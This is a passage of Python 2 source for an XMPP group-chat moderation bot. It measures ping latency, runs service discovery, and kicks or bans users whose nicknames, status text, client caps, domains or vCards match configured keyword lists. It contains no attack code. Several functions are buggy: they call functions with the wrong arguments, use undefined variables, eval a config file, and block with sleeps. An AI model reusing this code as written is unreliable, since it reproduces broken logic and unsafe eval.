        s2s = min(TURBO_PING[jid]['s2s']) - bot#getMedian(TURBO_PING[jid]['s2s']) - bot
        if s2s<0:
            s2s=0.00
    rez = round((l-bot)-s2s, 3)
    
    rep = ('\n- '+str(rez)+u'...\n' if rez>0 else Xping[12])
    mp = (min(TURBO_PING[jid]['jid'])-bot)-s2s
    rep += Xping[13]+str(min(TURBO_PING[jid]['jid']))+Xping[21]+str(max(TURBO_PING[jid]['jid']))+Xping[22]
    rep += Xping[14]+str(len(TURBO_PING[jid]['jid']))+Xping[20]+str(round(l, 3))+Xping[19]
    rep += Xping[15]+str(round(bot, 2))+Xping[18]
    rep += Xping[16]+s[3].split('@')[1]+u' : '+str(round(s2s, 2))+Xping[19]
    rep += Xping[17]+str(round(l, 3))+' - '+str(bot)+') - '+str(round(s2s, 2))+' = '+str(rez)+'\n'
    res = (l-bot)-s2s
    #if res < 0:
    #    if usr in TRB_BUF.keys():
    #        del TRB_BUF[usr]
    #        reply(t, s, s[2]+' : '+u'Что-то глюкнуло!'+('\nPING JID: '+', '.join([str(x) for x in TURBO_PING[jid]['jid']])+'\nPING BOT: '+', '.join([str(x) for x in TURBO_PING[jid]['bot']]) if len(TURBO_PING[jid]['bot'])>1 and len(TURBO_PING[jid]['jid'])>1 else ''))
    #    return
    rep +=u'- ;-)'
    if res <= 0.1:
        rep+=Xping[23]
    if res <= 0.6 and res> 0.1:
        rep+=Xping[24]
    if res <= 1.1 and res>0.6:
        rep+=Xping[25]
    if res <=2.2 and res>1.1:
        rep+=Xping[26]
    if res <=5.5 and res>2.2:
        rep+=Xping[27]
    if res <=8.8 and res>5.5:
        rep+=Xping[28]
    if res >8.8:
        rep+=Xping[29]
    if usr in TRB_BUF.keys():
        del TRB_BUF[usr]
        

#register_command_handler(hnd_turboping, 'سرعة', ['все'], 0, 'Проверяет пинг указаного адреса в течении минуты, выводит медиану, максимальное и минимально значение.', 'турбопинг', ['турбопинг'])
#register_command_handler(hnd_turbo_info, 'турбоинфа', ['все'], 0, 'Журнал турбопинга', 'турбоинфа', ['турбоинфа'])


def turboping_handler_(jid, i, x):
    global TURBO_PING
    global TURBO_SERVER
    
    if x['type'] == 'result':
        t = time.time()
        
        if int(x['id']) in P_VAR['bot']:
            TURBO_PING[jid]['bot'].append(round(t-i, 3))
        if int(x['id']) in P_VAR['s2s']:
            TURBO_PING[jid]['s2s'].append(round(t-i, 3))
        if int(x['id']) in P_VAR['jid']:
            TURBO_PING[jid]['jid'].append(round(t-i, 3))
    else:
        pass


def getMedian(numericValues):
    theValues = sorted(numericValues)
    if len(theValues) % 2 == 1:
        return theValues[(len(theValues)+1)/2-1]
    else:
        lower = theValues[len(theValues)/2-1]
        upper = theValues[len(theValues)/2]
    return (float(lower + upper)) / 2
    


def ping_handler(t, s, p):
    if s[0].isdigit():
        reply(t, s, s[2]+' : '+u'Понг')
        return
    def errping(x, t, s):
        try:
            err = re.findall('\'(.*?)\'',x.getErrorMessage())
            if not err:
                err = x.getErrorMessage()
            else:
                err = err[0]
        except:
            err = str()
        reply(t, s, s[2]+' : '+u'Сервер ответил ошибкой: '+err)
    if t == 'irc':
        if s[0] in IRC_PING.keys():
            reply(t, s, s[2]+' : '+u'Запрос выполняется')
            return
        if s[1]!=IRC_NICK:
            IRC_PING[s[0]] = s[1]
        else:
            IRC_PING[s[0]] = s[0]
        IRC.ping(ircn(s[0]))
        return
    jid = s[1]+'/'+s[2]
    if p:
        if s[1] in GROUPCHATS and p in GROUPCHATS[s[1]]:
            jid = s[1]+'/'+p
        else:
            jid = p
    packet = xmlstream.IQ(CLIENTS[s[3]], 'get')#IQ
    packet.timeout = 20
    packet.addElement('query', 'jabber:iq:version')
    packet['id'] = str(random.randrange(1,9999))
    packet['to'] = jid
    #packet.addCallback(ping_result_handler, t, s, p, time.time())
    #reactor.callFromThread(packet.send, jid)
    def sender(packet, t, s, p):
        d = packet.send()
        d.addErrback(errping, t, s)
        d.addCallback(ping_result_handler, t, s, p, time.time())
            
    reactor.callFromThread(sender, packet, t, s, p)
    
    



def ping_result_handler(x, type, s, p, i):#last x arg, first type to old method
    add=''
    if not hasattr(x, '__getitem__'):
        return
    ERROR={'400':Xdisco[5],'401':Xdisco[5],'402':Xdisco[5],'403':Xdisco[5],'404':Xdisco[5],'405':Xdisco[5],'406':Xdisco[5],'407':Xdisco[5],'408':Xdisco[5],'409':Xdisco[5],'500':Xdisco[5],'501':Xdisco[5],'503':Xdisco[5],'504':Xdisco[5]}
    if x['type'] == 'error':
        try: code = [c['code'] for c in x.children if (c.name=='error')]
        except: code = []
        if ' '.join(code) in ERROR: add=ERROR[' '.join(code)]
        reply(type, s, s[2]+' : '+u'Не пингуется. '+' '.join(code)+' '+add)
        return
    elif x['type'] == 'result':
        t = time.time()
        rep = Xping[30]
        if p:
                rep += p
        else:
                rep += u'тебя'
        rep+=u' '+str(round(t-i, 3))+u' секунд'
        reply(type, s, s[2]+' : '+rep)

def disco_handler(t, s, p):
    if p:
        if p.count(' '):
            n = p.split()
            p, grep = n[0], n[1]
        else:
            p, grep = p, ' '
        if not p.count('.'):
            p=p+Xdisco[1]
        packet = IQ(CLIENTS[s[3]], 'get')
        packet.addElement('query', 'http://jabber.org/protocol/disco#items')
        packet.addCallback(disco_result_handler_a, t, s, p, grep)
        reactor.callFromThread(packet.send, p)
    else: reply(t, s, s[2]+' : '+Xdisco[2])

def disco_result_handler_a(t, s, p, grep, x):
    if x['type'] == 'result':
        query = element2dict(x)['query']
        query = [i.attributes for i in query.children if i.__class__==domish.Element]
        if p.count('conference.') or p.count('chat.') or p.count('muc.'):
            if p.count('@'):
                r = [i.get('name') for i in query]
                r.sort()
            else:
                r = []
                for i in query:
                    try: g = re.search('^(.+)\(([0-9]+)\)$', i['name']).groups()
                    except: g = (i['name'], '0')
                    if int(g[1]) < 99: r.append((g[0], i['jid'], g[1]))
                r.sort(lambda x, y: cmp(int(y[2]), int(x[2])))
                r = ['%s - %s (%s)' % i for i in r]
                ###r = r[:100]
        else:
            r = [i['jid'] for i in query]
            r.sort()
        if r: reply(t, s, s[2]+' : '+Xdisco[3]+show_list(r, grep))
        else: reply(t, s, s[2]+' : '+u'Blank disc!')
    elif x['type'] == 'error':
        code, add = [], ''
        ERROR={'400':u'رمز الخطأ','401':u'رمز الخطأ','402':u'رمز الخطأ','403':u'رمز الخطأ','404':u'رمز الخطأ','405':u'رمز الخطأ','406':u'رمز الخطأ','407':u'رمز الخطأ','408':u'رمز الخطأ','409':u'رمز الخطأ','500':u'رمز الخطأ','501':u'رمز الخطأ','503':u'رمز الخطأ','504':u'رمز الخطأ'}
        try: code = [c['code'] for c in x.children if (c.name=='error')]
        except: pass
        if ''.join(code) in ERROR: add=ERROR[' '.join(code)]
        reply(t, s, s[2]+' : '+Xdisco[4]+' '.join(code)+' '+add)
        return

def show_list(seq, grep=None, empty='[empty list]'):
 if len(seq) == 1: return seq[0]
 else:
  r = ''
  for i in range(len(seq)):
   r += '%s) %s\n' % (i+1, seq[i])
  if grep: r = '\n'.join([i for i in r.split('\n') if i.lower().count(grep.lower())])
  if not r: r = empty
  return r

#############################
import time
import datetime
from time import gmtime, strftime
from threading import Timer


USER_PING = {}

def join_user_ping(g, n, r, a, cljid):
    global USER_PING
    if not g in USER_PING or not g in GROUPCHATS or get_bot_nick(g)==n:
        return
    if 'timel' in USER_PING[g] and 'limit' in USER_PING[g] and 'now' in USER_PING[g]:
        if time.time() - USER_PING[g]['timel']<60:
            USER_PING[g]['now']+=1
            USER_PING[g]['timel'] = time.time()
            if USER_PING[g]['now']>USER_PING[g]['limit']:
                if a in ['participant']:
                    room_access3(cljid, g, 'role', 'visitor', 'nick', n)
                return
        USER_PING[g]['timel'] = time.time()
        if USER_PING[g]['now']!=0: USER_PING[g]['now'] = 0
    jid=g+'/'+n
    if a in ['participant','visitor']:
        if a==u'participant':
            room_access3(cljid, g, 'role', 'visitor', 'nick', n)
        packet = IQ(CLIENTS[cljid], 'get')
        packet.addElement('query', 'jabber:iq:version')
        packet.addCallback(user_ping_result, g, n, cljid)
        reactor.callFromThread(packet.send, jid)
        

def user_ping_result(g, n, cljid, x):
        if g in USER_PING:
            t = USER_PING[g].get('limit',3)
            time.sleep(t)
            room_access3(cljid, g, 'role', 'participant', 'nick', n)

def user_ping_init(cljid):
    try: db = eval(read_file(USER_PING_FILE))
    except:
        #write_file(USER_PING_FILE, '{}')
        db = {}
    global USER_PING
    USER_PING = db.copy()

def hnd_user_ping(t, s, p):
    if not s[1] in GROUPCHATS: return
    if not p:
        reply(t, s, s[2]+' : '+Xvip[1])
        return
    if p=='تعطيل'.decode('utf8'):
        if not s[1] in USER_PING:
            reply(t, s, s[2]+' : '+Xvip[2])
            return
        del USER_PING[s[1]]
        #write_file(USER_PING_FILE, str(USER_PING))
        reply(t, s, s[2]+' : '+Xvip[3])
        return
    if p==''.decode('utf8'):
        if s[1] in USER_PING:
            reply(t, s, s[2]+' : '+Xvip[4])
            return
        USER_PING[s[1]]={'limit':0,'now':0,'time':time.time()}
        #write_file(USER_PING_FILE, str(USER_PING))
        reply(t, s, s[2]+' : '+Xvip[5])
        return
    if p.split() and p.split()[0] == u'تفعيل'.decode('utf8') and p.split()[1].isdigit():
        USER_PING[s[1]]={'limit':int(p.split()[1]),'now':0,'timel':time.time()}
        #write_file(USER_PING_FILE, str(USER_PING))
        reply(t, s, s[2]+' : '+Xvip[6]+p.split()[1])
    if p.split() and p.split()[0] == u'time2' and p.split()[1].isdigit():
        if not s[1] in USER_PING:
            USER_PING[s[1]]={}
        USER_PING[s[1]]['timer']=int(p.split()[1])
        #write_file(USER_PING_FILE, str(USER_PING))
        reply(t, s, s[2]+' : '+Xvip[7])

register_join_handler(join_user_ping)
register_stage0_init(user_ping_init)
register(hnd_user_ping, Xvip[0], 30)
register(disco_handler, Xdisco[0], 11)
register(hnd_turboping, Xping[0], 11)
register(hnd_turboping, Xping[1], 11)
#السرعة و التجسس
######################################################
######################################################
def Check1vCard(data):
        for x in vCardBad:
                if x in data:
                        return True
        return False
def banos55_join(g, n, r, afl, cljid):
        if "off" not in Filter_vCard:
                packet = IQ(CLIENTS[cljid], 'get')
                packet.addElement('vCard', 'vcard-temp')
                packet.addCallback(vcard_result_handlerg1, g, n, cljid)
                reactor.callFromThread(packet.send, g+'/'+n)

def vcard_result_handlerg1(g, n, cljid, x):
        if x['type'] == 'result':
                try: vcard = parse_vcard(element2dict(x)['vCard'])
                except: return
                r = ""
                for i in vcard.keys():
                        q = i.split('/')
                        q = [j for j in q if j in r]
                        if (not q and not('*' in r)) or i.count('BINVAL'): vcard.pop(i)
                res = [vcard[i] for i in vcard.keys() if vcard[i].strip()]
                if Check1vCard(res):
                        room_access(cljid, g, get_true_jid(g+'/'+n))

register_join_handler(banos55_join)
					
######################################################
######################################################
#ارتباطات مع اكل و فلاتر
XMSG5 = Xacl[76] 
XMSG11= Xacl[78] 
XMSG12 = Xacl[77] 
XMSG1= Xacl[34]   
XMSG2 = Xacl[31]
XMSG9 = Xacl[67]  
XMSG10 = Xacl[66]  



def hnd_new1(x, cljid):
    try: hnd_new2(x, cljid)
    except: pass
def hnd_new2(x, cljid):
 jid = x['from'].split('/')
 groupchat = jid[0]
 nick = x['from'][len(groupchat)+1:]
 s = [groupchat+'/'+nick, groupchat, nick, cljid]    
 _x = [i for i in x.children if (i.name=='x') and (i.uri=='http://jabber.org/protocol/muc#user')][0]
 _item = [i for i in _x.children if i.name=='item'][0]
 jid1 = _item['jid']
 resource = jid1.split("/")[1]
 if not groupchat in BANRES:
  BANRES[groupchat]={}                
 for x in BANRES[groupchat].keys():
   if x in resource:
    if "طرد".decode('utf8') in BANRES[groupchat][x].keys() :
     filter_melody1 (s, "".join(BANRES[groupchat][x]["طرد".decode('utf8')].keys()), 'role', 'none')
    if "فصل".decode('utf8') in BANRES[groupchat][x].keys() :
     filter_melody1 (s, "".join(BANRES[groupchat][x]["فصل".decode('utf8')].keys()), 'affiliation', 'outcast')   
 for x in GBANRES:
   if x in resource:
    if "طرد".decode('utf8') in GBANRES[x].keys() :
     filter_melody1 (s, "".join(GBANRES[x]["طرد".decode('utf8')].keys()), 'role', 'none')
    if "فصل".decode('utf8') in GBANRES[x].keys() :
     filter_melody1 (s, "".join(GBANRES[x]["فصل".decode('utf8')].keys()), 'affiliation', 'outcast')   	 
 hnd_new1(groupchat, nick, afl, role, cljid)
register_presence_handler(hnd_new1)
#####
def checkstatus(data, groupchat):
        global BANST
        if not groupchat in BANST or not BANST[groupchat].keys():
                return
        for x in BANST[groupchat].keys():
                if x in data:
                        return True
        return False
def checkstatusall(data, groupchat):
        global BADall
        if not groupchat in BADall or not BADall[groupchat].keys():
                return
        for x in BADall[groupchat].keys():
                if x in data:
                        return True
        return False
def checkstatusx(data):       
        global GBANST
        for x in GBANST:
                if x in data:
                        return True
        return False
def checkstatusxall(data):       
        global GBADall
        for x in GBADall:
                if x in data:
                        return True
        return False
################OS
def Nick_nawrsx1(nick):
        global GBADNICK      
        body1=nick.replace('ـ','').replace(',','').replace(':','').replace('9','').replace('8','').replace('7','').replace('6','').replace('5','').replace('4','').replace('3','').replace('2','').replace('1','').replace(' ','').replace('.','').replace('ط›','').replace('~','').replace('"','').replace(']','').replace('[','').replace(')','').replace('(','').replace('>','').replace('<','').replace('طں','').replace('?','').replace('=','').replace('+','').replace('_','').replace('-','').replace('*','').replace('&','').replace('^','').replace('%','').replace('$','').replace('#','').replace('@','').replace('!','').replace('؟','').replace('?','').replace('0','').replace('،','')                           
        for x in GBADNICK[groupchat].keys():
                if x in body1:
                        return True
        return False
def Nick_nawrs1(nick,groupchat):
        global BADNICK
        if not groupchat in BADNICK or not BADNICK[groupchat].keys():
                return        
        body1=nick.replace('ـ','').replace(',','').replace(':','').replace('9','').replace('8','').replace('7','').replace('6','').replace('5','').replace('4','').replace('3','').replace('2','').replace('1','').replace(' ','').replace('.','').replace('ط›','').replace('~','').replace('"','').replace(']','').replace('[','').replace(')','').replace('(','').replace('>','').replace('<','').replace('طں','').replace('?','').replace('=','').replace('+','').replace('_','').replace('-','').replace('*','').replace('&','').replace('^','').replace('%','').replace('$','').replace('#','').replace('@','').replace('!','').replace('؟','').replace('?','').replace('0','').replace('،','')                           
        for x in BADNICK[groupchat].keys():
                if x in body1:
                        return True
        return False
def Nick_nawrsx2(nick):
        global GBADall     
        body1=nick.replace('ـ','').replace(',','').replace(':','').replace('9','').replace('8','').replace('7','').replace('6','').replace('5','').replace('4','').replace('3','').replace('2','').replace('1','').replace(' ','').replace('.','').replace('ط›','').replace('~','').replace('"','').replace(']','').replace('[','').replace(')','').replace('(','').replace('>','').replace('<','').replace('طں','').replace('?','').replace('=','').replace('+','').replace('_','').replace('-','').replace('*','').replace('&','').replace('^','').replace('%','').replace('$','').replace('#','').replace('@','').replace('!','').replace('؟','').replace('?','').replace('0','').replace('،','')                           
        for x in GBADall:
                if x in body1:
                        return True
        return False
def Nick_nawrs2(nick,groupchat):
        global BADall
        if not groupchat in BADall or not BADall[groupchat].keys():
                return        
        body1=nick.replace('ـ','').replace(',','').replace(':','').replace('9','').replace('8','').replace('7','').replace('6','').replace('5','').replace('4','').replace('3','').replace('2','').replace('1','').replace(' ','').replace('.','').replace('ط›','').replace('~','').replace('"','').replace(']','').replace('[','').replace(')','').replace('(','').replace('>','').replace('<','').replace('طں','').replace('?','').replace('=','').replace('+','').replace('_','').replace('-','').replace('*','').replace('&','').replace('^','').replace('%','').replace('$','').replace('#','').replace('@','').replace('!','').replace('؟','').replace('?','').replace('0','').replace('،','')                           
        for x in BADall[groupchat].keys():
                if x in body1:
                        return True
        return False 
		
FILTER_MEMBER ={}		

def hnd_filter_prs_melody(prs, cljid):

 try:         
    try: jid = prs['from'].split('/')
    except: return
    groupchat = jid[0]
    nick = prs['from'][len(groupchat)+1:]
    
    if groupchat in GROUPCHATS and nick == get_bot_nick(groupchat):
        return
    if groupchat not in GROUPCHATS:
        return
        
    try: type = prs['type']
    except: type = None

    s = [groupchat+'/'+nick, groupchat, nick, cljid]
            
    jid = get_true_jid(groupchat+'/'+nick)
    
    domain = jid.split("@")[1].split("/")[0]   
    user = jid.split("@")[0]  
    
    if not groupchat in BANST:
        BANST[groupchat]={}
    if not groupchat in BANCAPS:
        BANCAPS[groupchat]={}
    if not groupchat in BANDO:
        BANDO[groupchat]={}
    if not groupchat in BANJID:
        BANJID[groupchat]={}
    if not groupchat in BADNICK:
        BADNICK[groupchat]={}
    if not groupchat in ROLEX:
        ROLEX[groupchat]={} 		
    try: caps1 = [i for i in prs.children if i.name=='c'][0]
    except: caps1 = ""	
    try: caps = caps1['node']
    except: caps  = ""

    try: status = [i for i in prs.children if i.name=='status'][0].children[0]
    except: status = ""
    try:
                _x = [i for i in prs.children if (i.name=='x') and (i.uri == 'http://jabber.org/protocol/muc#user')][0]
                _item = [i for i in _x.children if i.name=='item'][0]
                try: afl = _item['affiliation']
                except: pass
                try: role = _item['role']
                except: pass
                try: code = ''.join([i['code'] for i in _x.children if i.name=='status'])
                except: pass
                try: reason = [i for i in _item.children if i.name=='reason'][0].children[0]
                except: pass
    except: pass
    
    #CAPS	
    for x in BANCAPS[groupchat].keys():
     if x in caps and "فصل".decode('utf8') in BANCAPS[groupchat][x].keys():
      filter_melody1 (s, "".join(BANCAPS[groupchat][x]["فصل".decode('utf8')].keys()), 'affiliation', 'outcast')
    for x in BANCAPS[groupchat].keys():
     if x in caps and "طرد".decode('utf8') in BANCAPS[groupchat][x].keys():
      filter_melody1 (s, "".join(BANCAPS[groupchat][x]["طرد".decode('utf8')].keys()), 'role', 'none')
    for x in GBANCAPS:
     if x in caps and "فصل".decode('utf8') in GBANCAPS[x].keys():
      filter_melody1 (s, "".join(GBANCAPS[x]["فصل".decode('utf8')].keys()), 'affiliation', 'outcast')
    for x in GBANCAPS:
     if x in caps and "طرد".decode('utf8') in GBANCAPS[x].keys():
      filter_melody1 (s, "".join(GBANCAPS[x]["طرد".decode('utf8')].keys()), 'role', 'none')
	  
    #status  
    if checkstatus(status, groupchat) :        
        for x in BANST[groupchat].keys():
               if x in status:
                        if "طرد".decode('utf8') in BANST[groupchat][x].keys() :
                                filter_melody1 (s, "".join(BANST[groupchat][x]["طرد".decode('utf8')].keys()), 'role', 'none')
                        if "فصل".decode('utf8') in BANST[groupchat][x].keys() :
                                filter_melody1 (s, "".join(BANST[groupchat][x]["فصل".decode('utf8')].keys()), 'affiliation', 'outcast')    
                        else: pass
    if checkstatusall(status, groupchat) :        
        for x in BADall[groupchat].keys():
               if x in status:
                        if "طرد".decode('utf8') in BADall[groupchat][x].keys() :
                                filter_melody1 (s, "".join(BADall[groupchat][x]["طرد".decode('utf8')].keys()), 'role', 'none')
                        if "فصل".decode('utf8') in BADall[groupchat][x].keys() :
                                filter_melody1 (s, "".join(BADall[groupchat][x]["فصل".decode('utf8')].keys()), 'affiliation', 'outcast')    
                        else: pass                        
    if checkstatusx(status) :        
        for x in GBANST:
               if x in status:                     
                        if "طرد".decode('utf8') in GBANST[x].keys() :
                                filter_melody1 (s, "".join(GBANST[x]["طرد".decode('utf8')].keys()), 'role', 'none')
                        if "فصل".decode('utf8') in GBANST[x].keys() :
                                filter_melody1 (s, "".join(GBANST[x]["فصل".decode('utf8')].keys()), 'affiliation', 'outcast')
                        else: pass
    if checkstatusxall(status) :        
        for x in GBADall:
               if x in status:                     
                        if "طرد".decode('utf8') in GBADall[x].keys() :
                                filter_melody1 (s, "".join(GBADall[x]["طرد".decode('utf8')].keys()), 'role', 'none')
                        if "فصل".decode('utf8') in GBADall[x].keys() :
                                filter_melody1 (s, "".join(GBADall[x]["فصل".decode('utf8')].keys()), 'affiliation', 'outcast')
                        else: pass                           
	#DOMAIN					
    if domain in BANDO[groupchat].keys() and "فصل".decode('utf8') in BANDO[groupchat][domain].keys() :
                filter_melody1 (s, "".join(BANDO[groupchat][domain]["فصل".decode('utf8')].keys()), 'affiliation', 'outcast')               
    if domain in BANDO[groupchat].keys() and "طرد".decode('utf8') in BANDO[groupchat][domain].keys() :
                filter_melody1 (s, "".join(BANDO[groupchat][domain]["طرد".decode('utf8')].keys()), 'role', 'none')    
				
    if domain in GBANDO and "فصل".decode('utf8') in GBANDO[domain].keys() :
                filter_melody1 (s, "".join(GBANDO[domain]["فصل".decode('utf8')].keys()), 'affiliation', 'outcast')               
    if domain in GBANDO and "طرد".decode('utf8') in GBANDO[domain].keys() :
                filter_melody1 (s, "".join(GBANDO[domain]["طرد".decode('utf8')].keys()), 'role', 'none')  

		
    for x in BANJID[groupchat].keys():
                if x in user:
                        if "طرد".decode('utf8') in BANJID[groupchat][x].keys() :
                                filter_melody1 (s, "".join(BANJID[groupchat][x]["طرد".decode('utf8')].keys()), 'role', 'none')
                        if "فصل".decode('utf8') in BANJID[groupchat][x].keys() :
                                filter_melody1 (s, "".join(BANJID[groupchat][x]["فصل".decode('utf8')].keys()), 'affiliation', 'outcast')   
			
    for x in GBANJID:
                if x in user:
                        if "طرد".decode('utf8') in GBANJID[x].keys() :
                                filter_melody1 (s, "".join(GBANJID[x]["طرد".decode('utf8')].keys()), 'role', 'none')
                        if "فصل".decode('utf8') in GBANJID[x].keys() :
                                filter_melody1 (s, "".join(GBANJID[x]["فصل".decode('utf8')].keys()), 'affiliation', 'outcast') 
	  								
    if Nick_nawrs1(nick,groupchat):  
        nick=nick.replace('ـ','').replace(',','').replace(':','').replace('9','').replace('8','').replace('7','').replace('6','').replace('5','').replace('4','').replace('3','').replace('2','').replace('1','').replace(' ','').replace('.','').replace('ط›','').replace('~','').replace('"','').replace(']','').replace('[','').replace(')','').replace('(','').replace('>','').replace('<','').replace('طں','').replace('?','').replace('=','').replace('+','').replace('_','').replace('-','').replace('*','').replace('&','').replace('^','').replace('%','').replace('$','').replace('#','').replace('@','').replace('!','').replace('؟','').replace('?','').replace('0','').replace('،','')                           
        for x in BADNICK[s[1]].keys():
                if nick.count(x):
                        if "طرد".decode('utf8') in BADNICK[s[1]][x].keys() :
                                filter_melody1 (s, "".join(BADNICK[s[1]][x]["طرد".decode('utf8')].keys()), 'role', 'none')
                        if "فصل".decode('utf8') in BADNICK[s[1]][x].keys() :
                                filter_melody1 (s, "".join(BADNICK[s[1]][x]["فصل".decode('utf8')].keys()), 'affiliation', 'outcast')                                
    if Nick_nawrsx1(nick): 
        nick=nick.replace('ـ','').replace(',','').replace(':','').replace('9','').replace('8','').replace('7','').replace('6','').replace('5','').replace('4','').replace('3','').replace('2','').replace('1','').replace(' ','').replace('.','').replace('ط›','').replace('~','').replace('"','').replace(']','').replace('[','').replace(')','').replace('(','').replace('>','').replace('<','').replace('طں','').replace('?','').replace('=','').replace('+','').replace('_','').replace('-','').replace('*','').replace('&','').replace('^','').replace('%','').replace('$','').replace('#','').replace('@','').replace('!','').replace('؟','').replace('?','').replace('0','').replace('،','')                           
        for x in GBADNICK:
                if nick.count(x):
                        if "طرد".decode('utf8') in GBADNICK[x].keys() :
                                filter_melody1 (s, "".join(GBADNICK[x]["طرد".decode('utf8')].keys()), 'role', 'none')
                        if "فصل".decode('utf8') in GBADNICK[x].keys() :
                                filter_melody1 (s, "".join(GBADNICK[x]["فصل".decode('utf8')].keys()), 'affiliation', 'outcast')

    if Nick_nawrs2(nick,groupchat):  
        nick=nick.replace('ـ','').replace(',','').replace(':','').replace('9','').replace('8','').replace('7','').replace('6','').replace('5','').replace('4','').replace('3','').replace('2','').replace('1','').replace(' ','').replace('.','').replace('ط›','').replace('~','').replace('"','').replace(']','').replace('[','').replace(')','').replace('(','').replace('>','').replace('<','').replace('طں','').replace('?','').replace('=','').replace('+','').replace('_','').replace('-','').replace('*','').replace('&','').replace('^','').replace('%','').replace('$','').replace('#','').replace('@','').replace('!','').replace('؟','').replace('?','').replace('0','').replace('،','')                           
        for x in BADall[s[1]].keys():
                if nick.count(x):
                        if "طرد".decode('utf8') in BADall[s[1]][x].keys() :
                                filter_melody1 (s, "".join(BADall[s[1]][x]["طرد".decode('utf8')].keys()), 'role', 'none')
                        if "فصل".decode('utf8') in BADall[s[1]][x].keys() :
                                filter_melody1 (s, "".join(BADall[s[1]][x]["فصل".decode('utf8')].keys()), 'affiliation', 'outcast')                                
    if Nick_nawrsx2(nick): 
        nick=nick.replace('ـ','').replace(',','').replace(':','').replace('9','').replace('8','').replace('7','').replace('6','').replace('5','').replace('4','').replace('3','').replace('2','').replace('1','').replace(' ','').replace('.','').replace('ط›','').replace('~','').replace('"','').replace(']','').replace('[','').replace(')','').replace('(','').replace('>','').replace('<','').replace('طں','').replace('?','').replace('=','').replace('+','').replace('_','').replace('-','').replace('*','').replace('&','').replace('^','').replace('%','').replace('$','').replace('#','').replace('@','').replace('!','').replace('؟','').replace('?','').replace('0','').replace('،','')                           
        for x in GBADall:
                if nick.count(x):
                        if "طرد".decode('utf8') in GBADall[x].keys() :
                                filter_melody1 (s, "".join(GBADall[x]["طرد".decode('utf8')].keys()), 'role', 'none')
                        if "فصل".decode('utf8') in GBADall[x].keys() :
                                filter_melody1 (s, "".join(GBADall[x]["فصل".decode('utf8')].keys()), 'affiliation', 'outcast')									
                               
    if "member" in ROLEX[groupchat].keys() and "none" in ROLEX[groupchat]["member"].keys() and "member" in afl:
        time123="".join(ROLEX[s[1]]["member"]["none"].keys())    
        time.sleep(float(time123))    
        filter_memberx(s,"none")
    if "member" in ROLEX[groupchat].keys() and "طرد".decode('utf8') in ROLEX[groupchat]["member"].keys() and "member" in afl:   
        filter_melody1 (s, "".join(ROLEX[s[1]]["member"]["طرد".decode('utf8')].keys()), 'role', 'none')
    if "member" in ROLEX[groupchat].keys() and "فصل".decode('utf8') in ROLEX[groupchat]["member"].keys() and "member" in afl:  
        filter_melody1 (s, "".join(ROLEX[s[1]]["member"]["فصل".decode('utf8')].keys()), 'affiliation', 'outcast')
    if "member" in ROLEX[groupchat].keys() and "visitor" in ROLEX[groupchat]["member"].keys() and "member" in afl:
        time1231="".join(ROLEX[s[1]]["member"]["visitor"].keys())    
        time.sleep(float(time1231))     
        filter_memberx(s,"none")        
        filter_moderatorxx(s,"visitor")        
  
    if "moderator" in ROLEX[groupchat].keys() and "none" in ROLEX[groupchat]["moderator"].keys() and "moderator" in role and "admin" not in afl:
        time12311="".join(ROLEX[s[1]]["moderator"]["none"].keys())    
        time.sleep(float(time12311))            
        filter_memberx(s,"none")            
        filter_moderatorxx(s,"participant")
    if "moderator" in ROLEX[groupchat].keys() and "طرد".decode('utf8') in ROLEX[groupchat]["moderator"].keys() and "moderator" in role and "admin" not in afl:
        filter_moderatorxx(s,"participant")            
        filter_melody1 (s, "".join(ROLEX[s[1]]["moderator"]["طرد".decode('utf8')].keys()), 'role', 'none')
    if "moderator" in ROLEX[groupchat].keys() and "فصل".decode('utf8') in ROLEX[groupchat]["moderator"].keys() and "moderator" in role and "admin" not in afl:
        filter_moderatorxx(s,"participant")            
        filter_melody1 (s, "".join(ROLEX[s[1]]["moderator"]["فصل".decode('utf8')].keys()), 'affiliation', 'outcast')
    if "moderator" in ROLEX[groupchat].keys() and "member" in ROLEX[groupchat]["moderator"].keys() and "moderator" in role and "admin" not in afl:
        time123112="".join(ROLEX[s[1]]["moderator"]["member"].keys())    
        time.sleep(float(time123112))              
        filter_memberx(s,"member")          
        filter_moderatorxx(s,"participant")
    if "moderator" in ROLEX[groupchat].keys() and "visitor" in ROLEX[groupchat]["moderator"].keys() and "moderator" in role and "admin" not in afl:
        time1231121="".join(ROLEX[s[1]]["moderator"]["visitor"].keys())    
        time.sleep(float(time1231121))             
        filter_memberx(s,"none")            
        filter_moderatorxx(s,"visitor")        

    if "none" in ROLEX[groupchat].keys() and "member" in ROLEX[groupchat]["none"].keys() and "none" in afl:
        timwe="".join(ROLEX[s[1]]["none"]["member"].keys())    
        time.sleep(float(timwe))              
        filter_memberx(s,"member")
    if "none" in ROLEX[groupchat].keys() and "طرد".decode('utf8') in ROLEX[groupchat]["none"].keys() and "none" in afl:   
        filter_melody1 (s, "".join(ROLEX[s[1]]["none"]["طرد".decode('utf8')].keys()), 'role', 'none')
    if "none" in ROLEX[groupchat].keys() and "فصل".decode('utf8') in ROLEX[groupchat]["none"].keys() and "none" in afl:  
        filter_melody1 (s, "".join(ROLEX[s[1]]["none"]["فصل".decode('utf8')].keys()), 'affiliation', 'outcast')
    if "none" in ROLEX[groupchat].keys() and "visitor" in ROLEX[groupchat]["none"].keys() and "none" in afl:
        timwe1="".join(ROLEX[s[1]]["none"]["visitor"].keys())    
        time.sleep(float(timwe1))             
        filter_moderatorxx(s,"visitor")

    if "visitor" in ROLEX[groupchat].keys() and "none" in ROLEX[groupchat]["visitor"].keys() and "visitor" in role:
        timwe2="".join(ROLEX[s[1]]["visitor"]["none"].keys())    
        time.sleep(float(timwe2))             
        filter_moderatorxx(s,"participant")
    if "visitor" in ROLEX[groupchat].keys() and "طرد".decode('utf8') in ROLEX[groupchat]["visitor"].keys() and "visitor" in role:  
        filter_melody1 (s, "".join(ROLEX[s[1]]["visitor"]["طرد".decode('utf8')].keys()), 'role', 'none')
    if "visitor" in ROLEX[groupchat].keys() and "فصل".decode('utf8') in ROLEX[groupchat]["visitor"].keys() and "visitor" in role:  
        filter_melody1 (s, "".join(ROLEX[s[1]]["visitor"]["فصل".decode('utf8')].keys()), 'affiliation', 'outcast')
    if "visitor" in ROLEX[groupchat].keys() and "member" in ROLEX[groupchat]["visitor"].keys() and "visitor" in role:
        timwe3="".join(ROLEX[s[1]]["visitor"]["member"].keys())    
        time.sleep(float(timwe3))     		
        filter_memberx(s,"member")
        
    if "no" not in FILTER_FASTJOIN_MEMBER:                 
     if not groupchat in FILTER_MEMBER.keys():
      FILTER_MEMBER[groupchat]={}
